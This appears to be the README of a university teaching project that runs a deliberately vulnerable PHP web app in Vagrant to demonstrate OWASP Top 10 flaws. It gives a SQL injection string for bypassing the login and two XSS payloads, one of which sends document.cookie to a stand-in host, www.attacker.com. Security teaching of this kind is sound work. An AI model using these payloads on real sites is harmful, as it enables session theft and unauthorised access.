# zcu_webapp_security_demo
Small education project demonstrating typical security vulnerabilities in web application.
Created for University of West Bohemia.

## Installation
* Install VirtualBox
* Install [Vagrant](https://docs.vagrantup.com/v2/installation/index.html "Vagrant docs - Istallation")
* Install Vagrant plugin for VirtualBox guest additions
```bash
vagrant plugin install vagrant-vbguest
```
* checkout this repository
```bash
> git clone git@github.com:veny/zcu_webapp_security_demo.git
```
* run vagrant box
```bash
> cd $PRJ_HOME
> vagrant up
```
* in browser go to http://192.168.33.10/index.php

## OWASP top 10 examples
* https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project

### Injection
* put that as password (empty username)
```sql
' OR id='2
```

### XSS
* put following text as notice
```html
<b onmouseup=alert("XSS!")>click me!</b>
```
* or even worst
```html
"><script>document.location= "http://www.attacker.com/cgi-bin/cookie.cgi?foo="+document.cookie</script>"
```
___

### TODOs:
- when you start the machine for the first time there is mysql error at the end of the provisioning:
  - ==> default: ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
  - ==> default: ERROR 2002 (HY000): Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2)
